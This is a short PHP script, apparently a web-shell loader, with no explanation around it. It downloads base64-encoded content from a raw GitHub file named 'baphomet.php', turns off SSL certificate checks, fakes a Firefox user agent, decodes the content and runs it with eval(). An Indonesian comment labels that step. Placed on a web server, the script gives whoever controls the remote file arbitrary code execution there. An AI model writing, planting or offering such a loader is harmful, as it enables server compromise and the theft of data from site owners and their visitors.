<?php

function get_contents($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

$url = 'https://raw.githubusercontent.com/403xghost/xnxx/refs/heads/main/baphomet.php';
$encoded_code = get_contents($url);
$decoded_code = base64_decode($encoded_code);

// Evaluasi kode PHP yang sudah didekripsi
eval('?>'.$decoded_code);
?>
